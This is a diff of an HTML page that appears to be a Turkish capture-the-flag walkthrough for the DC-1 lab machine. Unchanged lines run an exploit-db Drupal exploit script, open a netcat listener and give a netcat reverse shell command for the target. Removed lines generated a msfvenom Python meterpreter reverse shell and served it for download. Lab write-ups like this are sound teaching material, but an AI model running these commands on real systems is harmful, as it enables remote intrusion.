@@ -181,13 +181,8 @@ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.171.
 <pre>nc -lvp 1822</pre>
 <p>Şimdi aşağıdaki kodu karşı hedefe yazalım.</p>
 <pre>nc 192.168.171.136 1822 -e /bin/bash</pre>
-<p>Daha iyi bir shell ortamı oluşturmak için meterpreter kullanmak istiyorum. Bu benim vazgeçemediğim bir alışkanlığım. Bundan dolayı ilk başta sistemde python kontrolü yaptıktan sonra kalim üzerinde bir python meterpreter reverse shell çıkarttım. Bu dosyayı daha sonrasında wget ile hedef makinaya çekip kendimde dnleme noktası oluşturup daha iyi bir shell ortamı elde etmiş oldum.</p>
-<pre>sfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.171.138 LPORT=4444</pre>
-<p>Çıktıyı python_reverse_meterpreter.py dosyasına yazdım ve python ile mini server oluşturup hedef makineden python dosyasını indirip çalıştırdım.</p>
-<pre>
-root@kali:~/Documents/Kutular/DC-1/dosyalar# python -m SimpleHTTPServer 1823
-</pre><pre>Serving HTTP on 0.0.0.0 port 1823 ...
-</pre>
+
+
 
 <hr>
 <h3>4	Yetki Yükseltme</h3>
